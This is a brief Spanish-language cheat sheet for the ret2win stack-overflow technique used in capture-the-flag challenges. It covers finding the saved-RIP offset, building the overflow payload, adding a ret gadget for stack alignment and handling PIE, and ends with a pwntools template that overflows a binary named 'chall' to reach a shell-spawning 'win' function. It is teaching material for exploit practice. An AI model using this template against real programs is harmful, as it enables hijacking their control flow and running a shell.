# ret2win (cheat sheet)

Patron: overflow de stack + una funcion "regalo" (win/shell/backdoor) que ya hace lo que
quieres (system("/bin/sh"), imprime la flag). No necesita leak si el binario es no-PIE.

## Pasos
1. Encontrar el offset del buffer al saved RIP (cyclic/De Bruijn: enviar patron, leer el
   valor que sobrescribe RIP, cyclic_find). Tipico: buf_size + 8 (saved rbp).
2. payload = b"A"*offset + p64(win).
3. Alineacion de stack (x86-64): system/printf usan movaps y exigen rsp%16==0 en la llamada.
   Si crashea dentro de la funcion, anadir un gadget `ret` antes de win: b"A"*off + p64(ret)
   + p64(win). El `ret` desplaza 8 y realinea.

## PIE
win = pie_base + win_offset. Con ASLR off la base es fija; en real, fugarla primero.

## pwntools
```python
from pwn import *
elf = context.binary = ELF('./chall')
io = process(elf.path)
io.sendline(flat({offset: [elf.sym.ret, elf.sym.win]}))
io.interactive()
```
